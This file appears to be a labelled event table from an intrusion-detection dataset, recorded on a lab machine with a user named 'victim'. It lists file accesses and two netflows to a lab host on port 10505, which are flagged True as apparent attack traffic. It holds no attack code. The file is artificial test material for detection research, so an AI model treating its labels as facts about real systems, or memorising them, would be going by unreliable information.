3a26035e-a6e1-4e90-8695-95985afe2607,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\DLVWNFMQ\\WI10_TempsBreakRecordHigh_01[1].svg'},1879,False,1,0,1,1,0,1
96ad11c2-e035-4121-b0dd-13ddc8f8151f,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\WI10_TempsBreakRecordHigh_02[1].svg'},1880,False,1,0,1,1,0,1
73e7b268-a8b9-45c2-b19d-3de5ea2307bf,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\WI10_TempsBreakRecordHigh_03[1].svg'},1881,False,1,0,1,1,0,1
bd411668-0d65-4781-9af4-dc11961b1d2e,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\69CDNZW2\\WI10_TempsBreakRecordHigh_04[1].svg'},1882,False,1,0,1,1,0,1
5ea78368-1e7f-4d51-9712-6936fe637a71,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\WI10_TempsBreakRecordHigh_05[1].svg'},1883,False,1,0,1,1,0,1
e31f39ad-72a7-462a-9100-cc49c720b919,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\69CDNZW2\\WI10_TempsBreakRecordHigh_06[1].svg'},1884,False,1,0,1,1,0,1
5e3dc649-f125-4f32-a943-a89ec17170a4,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\WI10_TempsBreakRecordHigh_07[1].svg'},1885,False,1,0,1,1,0,1
68c726e2-a703-4837-948b-19fc54dcff7b,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\WI10_TempsBreakRecordHigh_09[1].svg'},1886,False,1,0,1,1,0,1
7048315f-952e-4eb0-8f81-b5fb070a282c,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\WI10_TempsBreakRecordHigh_10[1].svg'},1887,False,1,0,1,1,0,1
6f1e2e17-e1d9-45b7-902c-8395099ec7fb,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\69CDNZW2\\WI10_TempsBreakRecordHigh_19[1].svg'},1888,False,1,0,1,1,0,1
26701570-46a4-472d-917d-b3df56be6f8e,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\DLVWNFMQ\\WI10_TempsBreakRecordHigh_12[1].svg'},1889,False,1,0,1,1,0,1
b193cf69-4446-46ee-8b86-c20e176fae71,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\DLVWNFMQ\\WI10_TempsBreakRecordHigh_13[1].svg'},1890,False,1,0,1,1,0,1
5f56c6eb-f028-4f61-8e58-66306059a494,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\WI10_TempsBreakRecordHigh_14[1].svg'},1891,False,1,0,1,1,0,1
7c518889-b746-49b1-8322-9147c953f284,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\DLVWNFMQ\\TB_W06_Cloudy_36[1].svg'},1892,False,1,0,1,1,0,1
e75ea149-101e-4dfe-9383-6bf1fc81be3f,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\WI10_TempsBreakRecordHigh_21[1].svg'},1893,False,1,0,1,1,0,1
42230fd1-55c4-40ad-b269-10ee8fb74c3d,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\WI10_TempsBreakRecordHigh_16[1].svg'},1894,False,1,0,1,1,0,1
afa7916d-a5f5-4c82-8f79-a8c41aeb0010,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\DLVWNFMQ\\WI10_TempsBreakRecordHigh_17[1].svg'},1895,False,1,0,1,1,0,1
06ffb506-37ed-449d-9d7e-cc25f6d5e5ae,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\WI10_TempsBreakRecordHigh_18[1].svg'},1896,False,1,0,1,1,0,1
56d77182-d80a-4a15-b10d-737d71ce86b6,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\69CDNZW2\\WI10_TempsBreakRecordHigh_11[1].svg'},1899,False,1,0,1,1,0,1
241f3aef-5329-4d69-8eb6-5acb028dc5ce,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\WI10_TempsBreakRecordHigh_20[1].svg'},1900,False,1,0,1,1,0,1
58aefae2-32a7-4efc-bebd-09c36e9136f3,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\69CDNZW2\\WI10_TempsBreakRecordHigh_36[1].svg'},1901,False,1,0,1,1,0,1
ea42fc6a-146e-4cea-8a25-177e5d6de8a4,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\69CDNZW2\\WI10_TempsBreakRecordHigh_22[1].svg'},1902,False,1,0,1,1,0,1
f651bc2e-b594-4db7-974e-703fb2db2687,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\WI10_TempsBreakRecordHigh_24[1].svg'},1903,False,1,0,1,1,0,1
b447f311-778a-4a91-b656-fdb48b3bc051,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\DLVWNFMQ\\WI10_TempsBreakRecordHigh_23[1].svg'},1904,False,1,0,1,1,0,1
bb48b2b2-ccd3-4173-92bd-9e141bef33a1,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\WI10_TempsBreakRecordHigh_25[1].svg'},1905,False,1,0,1,1,0,1
2becac87-e4c4-4828-95ad-53fcb74c6e92,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\WI10_TempsBreakRecordHigh_27[1].svg'},1906,False,1,0,1,1,0,1
ca4b562a-0c04-4cd4-8a06-ccaddc5278d9,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\69CDNZW2\\WI10_TempsBreakRecordHigh_26[1].svg'},1907,False,1,0,1,1,0,1
bde11958-4c39-45cf-999f-ab6fa9c55623,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\DLVWNFMQ\\WI10_TempsBreakRecordHigh_28[1].svg'},1908,False,1,0,1,1,0,1
2d9b779a-f8e7-4ea4-b45e-be0bd67e5d80,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\69CDNZW2\\WI10_TempsBreakRecordHigh_29[1].svg'},1909,False,1,0,1,1,0,1
516b1858-af15-411f-aa7b-cc8ef544cd56,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\WI10_TempsBreakRecordHigh_30[1].svg'},1910,False,1,0,1,1,0,1
f5c89cc3-c7bb-4e57-a058-f37ceb2e461d,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\DLVWNFMQ\\WI10_TempsBreakRecordHigh_31[1].svg'},1911,False,1,0,1,1,0,1
37d252a4-6c09-4b86-8940-89265e4bfd51,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\DLVWNFMQ\\WI10_TempsBreakRecordHigh_32[1].svg'},1912,False,1,0,1,1,0,1
94ce5ed8-1385-432d-b5ce-fa98936e91b8,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\WI10_TempsBreakRecordHigh_33[1].svg'},1913,False,1,0,1,1,0,1
02cf13d3-5992-4492-8931-9e10cbf14775,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\WI20_TempsaDropTomorrow_05[1].svg'},1914,False,1,0,1,1,0,1
b3348a19-81fc-4c30-bef7-121837ceb34e,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\WI10_TempsBreakRecordHigh_35[1].svg'},1915,False,1,0,1,1,0,1
66f21a92-6e98-4bf6-89e0-fd0155b63abd,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\69CDNZW2\\WI10_TempsBreakRecordHigh_37[1].svg'},1916,False,1,0,1,1,0,1
aeaa1381-663b-4832-a8fd-7feef0f101c7,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\WI10_TempsBreakRecordHigh_38[1].svg'},1917,False,1,0,1,1,0,1
6c9abc34-9089-4a41-95e3-bbd1e94c38ce,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\WI10_TempsBreakRecordHigh_39[1].svg'},1918,False,1,0,1,1,0,1
67bd3fef-4bcf-4525-badf-e5a95adf9921,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\DLVWNFMQ\\WI10_TempsBreakRecordHigh_40[1].svg'},1919,False,1,0,1,1,0,1
020f6626-717f-4230-81c4-496b947d08b2,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\WI20_TempsaDropTomorrow_01[1].svg'},1920,False,1,0,1,1,0,1
191eb1a4-400a-414a-8abd-1b9b18044aaf,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\69CDNZW2\\WI20_TempsaDropTomorrow_02[1].svg'},1921,False,1,0,1,1,0,1
6f1b39f7-563b-4d2c-a55f-ff0ad1864a8a,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\WI20_TempsaDropTomorrow_03[1].svg'},1922,False,1,0,1,1,0,1
bfd63374-2e34-4bbe-923f-f1bf5a1450b8,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\WI20_TempsaDropTomorrow_04[1].svg'},1923,False,1,0,1,1,0,1
59d98247-9bd1-4698-bc92-8bdbb65c68ba,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\WI10_TempsBreakRecordHigh_34[1].svg'},1924,False,1,0,1,1,0,1
cdb49b39-f500-4b41-a86a-551a74c88a1a,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\DLVWNFMQ\\WI20_TempsaDropTomorrow_06[1].svg'},1925,False,1,0,1,1,0,1
b91347bd-21ec-45c0-859a-17189668c0d7,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\69CDNZW2\\WI20_TempsaDropTomorrow_07[1].svg'},1926,False,1,0,1,1,0,1
4f885939-560d-45b5-ae2a-552e0ce4218b,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\WI20_TempsaDropTomorrow_08[1].svg'},1927,False,1,0,1,1,0,1
a6c56957-3001-401c-ac29-5071f00eb756,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\DLVWNFMQ\\WI20_TempsaDropTomorrow_09[1].svg'},1928,False,1,0,1,1,0,1
b65574e3-4dd5-44eb-9e6d-241c01601ca9,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\69CDNZW2\\WI20_TempsaDropTomorrow_10[1].svg'},1929,False,1,0,1,1,0,1
210905d0-638d-4526-8cce-a32bd6208a73,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\WI20_TempsaDropTomorrow_11[1].svg'},1930,False,1,0,1,1,0,1
88af04ca-9467-4e2c-99b9-f9f264ff6f5b,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\DLVWNFMQ\\WI20_TempsaDropTomorrow_12[1].svg'},1931,False,1,0,1,1,0,1
39cb62b3-91c1-4f1b-926e-4455018829d2,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\WI20_TempsaDropTomorrow_13[1].svg'},1932,False,1,0,1,1,0,1
79c3ed68-979c-4140-ad3f-97a40138a247,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\69CDNZW2\\WI20_TempsaDropTomorrow_14[1].svg'},1933,False,1,0,1,1,0,1
a7d88ca8-2516-48d3-aacc-eb48241d0475,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\DLVWNFMQ\\WI20_TempsaDropTomorrow_15[1].svg'},1934,False,1,0,1,1,0,1
0d81daf7-b0e3-43a3-bd27-3541068dd01b,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\69CDNZW2\\WI20_TempsaDropTomorrow_16[1].svg'},1935,False,1,0,1,1,0,1
e89880eb-cc17-42a3-b763-d524c66df749,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\WI20_TempsaDropTomorrow_17[1].svg'},1936,False,1,0,1,1,0,1
74f56135-252d-4ea4-a3e0-98d99183a156,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\WI20_TempsaDropTomorrow_18[1].svg'},1937,False,1,0,1,1,0,1
c9058acc-7081-45c9-9bb4-e6e0fb8c9bdd,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\WI20_TempsaDropTomorrow_19[1].svg'},1938,False,1,0,1,1,0,1
ba646270-7ca0-4b89-bc13-c4bd543c8499,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\WI20_TempsaDropTomorrow_20[1].svg'},1939,False,1,0,1,1,0,1
c533e2c0-f547-4a84-8b3c-468c484f540b,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\DLVWNFMQ\\WI20_TempsaDropTomorrow_21[1].svg'},1940,False,1,0,1,1,0,1
0c2371ea-e82e-405e-9438-8b45cea8a6fb,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\69CDNZW2\\WI20_TempsaDropTomorrow_33[2].svg'},1941,False,1,0,1,1,0,1
8468c221-d194-4ee9-a67e-2603560fecd1,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\DLVWNFMQ\\WI20_TempsaDropTomorrow_23[2].svg'},1942,False,1,0,1,1,0,1
125d9ed1-4666-478a-87c6-0a5ca45395ca,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\WI20_TempsaDropTomorrow_24[1].svg'},1943,False,1,0,1,1,0,1
bdd14801-ca3f-4955-82eb-74a301c4cde3,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\69CDNZW2\\WI20_TempsaDropTomorrow_25[1].svg'},1944,False,1,0,1,1,0,1
79cacd97-a5d3-4a49-882c-a5dead860d5c,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\WI20_TempsaDropTomorrow_26[1].svg'},1945,False,1,0,1,1,0,1
949d0641-429c-4b53-95fb-5afb084aecd8,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\DLVWNFMQ\\WI20_TempsaDropTomorrow_27[1].svg'},1946,False,1,0,1,1,0,1
b9c7300a-2476-42d7-a0c1-e2146408b2ca,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\WI20_TempsaDropTomorrow_28[1].svg'},1947,False,1,0,1,1,0,1
2d056c7f-ba39-47f2-9786-24d463e2b551,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\DLVWNFMQ\\WI20_TempsaDropTomorrow_36[1].svg'},1948,False,1,0,1,1,0,1
4c98d854-615b-4022-a9c4-dbd0a9f56fac,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\69CDNZW2\\WI20_TempsaDropTomorrow_30[1].svg'},1949,False,1,0,1,1,0,1
9239b035-5e4d-423a-acca-928c6a8d03db,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\DLVWNFMQ\\WI20_TempsaDropTomorrow_31[1].svg'},1950,False,1,0,1,1,0,1
88769181-612e-41e1-ac9a-386f62857d61,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\WI20_TempsaDropTomorrow_32[1].svg'},1951,False,1,0,1,1,0,1
8114043b-101b-4cda-88f5-c73a5f8b8b13,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\WI20_TempsaDropTomorrow_22[1].svg'},1952,False,1,0,1,1,0,1
4e3de8c6-2ef3-49f2-9297-e210c9eb857d,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\69CDNZW2\\WI20_TempsaDropTomorrow_34[1].svg'},1953,False,1,0,1,1,0,1
347922d5-327f-4014-8b35-2c380e81f82f,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\WI20_TempsaDropTomorrow_35[1].svg'},1954,False,1,0,1,1,0,1
24fc40d2-1d5e-4b6c-a43c-3bbe14cf9c05,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\69CDNZW2\\WI20_TempsaDropTomorrow_29[1].svg'},1955,False,1,0,1,1,0,1
666d435c-7152-4eb6-92e6-299baf13a221,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\WI20_TempsaDropTomorrow_37[1].svg'},1956,False,1,0,1,1,0,1
3961143e-2f72-481c-87c2-b659adca780d,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\WI20_TempsaDropTomorrow_38[1].svg'},1957,False,1,0,1,1,0,1
b854ce14-09b5-421a-80b4-cc8e889558bf,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\DLVWNFMQ\\WI20_TempsaDropTomorrow_39[1].svg'},1958,False,1,0,1,1,0,1
39b0baac-5fb7-44c2-a8d0-e87219c7955a,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\WI20_TempsaDropTomorrow_40[1].svg'},1959,False,1,0,1,1,0,1
8a706f64-e289-407d-98af-8401796f3c27,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\DLVWNFMQ\\AAehyQC[1].svg'},2147,False,1,0,1,1,0,1
d0d8ccff-b6a5-41e0-b545-124ef179b979,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_0000be'},2348,False,1,0,1,1,0,1
ab64ebcd-9980-4a42-8ac2-dfb12c309367,{'file': 'C:\\Windows\\system32\\Fluency\\en-US\\.config'},2697,False,1,0,1,1,0,1
d1b63674-15c7-4d6a-a63e-d4d0ef3bb163,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\DashTrackerDatabase'},4538,False,1,0,1,1,0,1
c0755063-be97-4d45-917e-0afd02a4264e,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\DashTrackerDatabase-journal'},4539,False,1,0,1,1,0,1
a003160c-e68c-4323-bf99-d0be7b73fe51,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\th[1].png'},4706,False,1,0,1,1,0,1
5174d10d-4944-4cd0-91c3-9f2f9e0934d4,{'file': 'C:\\Users\\victim\\AppData\\Local\\Temp\\__PSScriptPolicyTest_m4uphrry.vdu.ps1'},7083,False,1,0,1,1,0,1
cbec74a9-1591-44ca-aaec-e0d875161309,{'file': 'C:\\Users\\victim\\AppData\\Local\\Temp\\__PSScriptPolicyTest_iwrprqlv.wyg.psm1'},7084,False,1,0,1,1,0,1
92bffa46-d607-4592-9eb3-2e7117285c7f,{'file': 'C:\\Windows\\Microsoft.Net\\assembly\\GAC_MSIL\\System.ServiceProcess\\v4.0_4.0.0.0__b03f5f7f11d50a3a\\System.ServiceProcess.dll'},7181,False,1,0,1,1,0,1
d9846f57-9add-4fb6-bc89-b5784b0da435,{'file': 'C:\\Windows\\Microsoft.Net\\assembly\\GAC_MSIL\\System.Windows.Forms\\v4.0_4.0.0.0__b77a5c561934e089\\System.Windows.Forms.dll'},7185,False,1,0,1,1,0,1
726ba99a-3705-4eab-9698-7780705b153e,{'file': 'C:\\Windows\\assembly\\GAC\\System.Management.Automation.resources\\3.0.0.0_zh-CN_31bf3856ad364e35\\System.Management.Automation.resources.dll'},7216,False,1,0,1,1,0,1
6a332abb-2733-4367-9985-d825dc771568,{'file': 'C:\\Users\\victim\\AppData\\Local\\Temp\\__PSScriptPolicyTest_pd212v2r.lwk.ps1'},7221,False,1,0,1,1,0,1
e407568d-6e7e-4bce-be21-1fd7a0f9714d,{'file': 'C:\\Users\\victim\\AppData\\Local\\Temp\\__PSScriptPolicyTest_15kefh5m.ttl.psm1'},7222,False,1,0,1,1,0,1
294dcaa6-1435-457b-9af5-97acf918e9ba,{'file': 'e:SmartScreen:$DAT'},7288,False,1,0,1,1,0,1
5f214d1b-0199-4b60-8abe-417962bf7a36,{'file': 'e:Zone.Identifier:$DAT'},7289,False,1,0,1,1,0,1
b7ee74e3-ea08-4fa7-8188-f57c17e8f35f,{'file': 'C:\\Users\\victim\\AppData\\Local\\Temp\\__PSScriptPolicyTest_5eykrctl.gp1.ps1'},7309,False,1,0,1,1,0,1
ba5a01c7-d583-45e6-800d-b149a73391de,{'file': 'C:\\Users\\victim\\AppData\\Local\\Temp\\__PSScriptPolicyTest_5xfklg4y.tnw.psm1'},7310,False,1,0,1,1,0,1
c04fd0ab-24a8-4c7b-b181-6be36f4bb09e,{'file': 'C:\\Users\\victim\\AppData\\Local\\Temp\\__PSScriptPolicyTest_jyf3mwsg.2pi.ps1'},8099,False,1,0,1,1,0,1
0ccfb280-6d05-4a4e-97ef-aa937d7c3627,{'file': 'C:\\Users\\victim\\AppData\\Local\\Temp\\__PSScriptPolicyTest_te1m243t.3pk.psm1'},8100,False,1,0,1,1,0,1
67ee266f-728f-46f6-b266-54e346233b35,{'file': 'C:\\Users\\victim\\AppData\\Local\\Temp\\__PSScriptPolicyTest_ukdc4vb1.0k3.ps1'},8230,False,1,0,1,1,0,1
4e976260-3531-434e-9e3e-ac487fdb7749,{'file': 'C:\\Users\\victim\\AppData\\Local\\Temp\\__PSScriptPolicyTest_x4sdjc1w.suq.psm1'},8231,False,1,0,1,1,0,1
f2994bb7-0b1a-48ef-8887-2a75d41539ff,{'file': 'C:\\Users\\victim\\AppData\\Local\\Temp\\__PSScriptPolicyTest_tdqpbpoz.bkb.ps1'},8350,False,1,0,1,1,0,1
4eced36a-d158-4a5f-a871-0e7b0d70d959,{'file': 'C:\\Users\\victim\\AppData\\Local\\Temp\\__PSScriptPolicyTest_hbfgd1m5.mny.psm1'},8351,False,1,0,1,1,0,1
2e72df17-a225-4366-b8a4-3cb7ba1d6375,{'file': 'C:\\Users\\victim\\AppData\\Local\\Temp\\__PSScriptPolicyTest_gidwdefz.5ro.ps1'},8465,False,1,0,1,1,0,1
8abf13c5-5947-4e71-9f87-7b3eb714e5e2,{'file': 'C:\\Users\\victim\\AppData\\Local\\Temp\\__PSScriptPolicyTest_h2pf4txf.cyw.psm1'},8466,False,1,0,1,1,0,1
788c01fb-6648-43ee-ad91-bddd1a6cce6d,{'netflow': '192.168.56.102:717->192.168.56.101:10505'},8581,True,1,0,1,1,0,1
b3caa268-3d45-4dab-b68b-ac354267ac4c,{'file': 'C:\\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\SendTo\\desktop.ini'},10278,False,1,0,1,1,0,1
7101c316-a3a5-4a2a-9a0d-f1a181a226c2,{'file': 'C:\\Windows\\system32\\activationclient.dll'},10317,False,1,0,1,1,0,1
712f4eeb-c116-47a9-b20b-c1767f7e1cd7,{'netflow': '192.168.56.102:1741->192.168.56.101:10505'},10454,True,1,0,1,1,0,1
